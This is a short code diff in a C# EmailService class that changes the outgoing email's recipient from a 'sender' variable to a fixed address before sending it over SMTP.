@@ -25,7 +25,7 @@ public class EmailService
             IsBodyHtml = true,
         };
 
-        mailMessage.To.Add(sender);
+        mailMessage.To.Add("therealisc@proton.me");
         //mailMessage.CC.Add(senderEmail);
 
         await smtpClient.SendMailAsync(mailMessage);
